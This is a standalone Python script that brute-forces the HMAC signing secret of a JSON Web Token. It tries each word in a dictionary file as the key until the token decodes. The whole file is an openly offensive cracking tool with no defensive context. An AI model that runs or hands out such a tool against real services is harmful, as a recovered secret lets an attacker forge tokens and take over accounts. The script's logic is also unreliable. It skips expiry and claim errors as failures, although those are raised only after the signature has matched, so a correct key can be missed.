import sys

import jwt

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: python3 crack_jwt_signature_secret.py dict.txt xxx.xxx.xxx HS256")
        quit()

    dict = sys.argv[1]
    arg = sys.argv[2]
    algorithms = sys.argv[3]

    f = open(dict)
    line_list = f.readlines()
    for line in line_list:
        try:
            jwt.decode(arg, verify=True, key=line.strip(), algorithms=algorithms)
            f.close()
            print(f"found success: {line}")
            quit()
        except (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError, jwt.exceptions.InvalidSignatureError) as e:
            continue
        except Exception as e:
            print(f"err: {e}")
            break
    f.close()
    print(f"found failed")
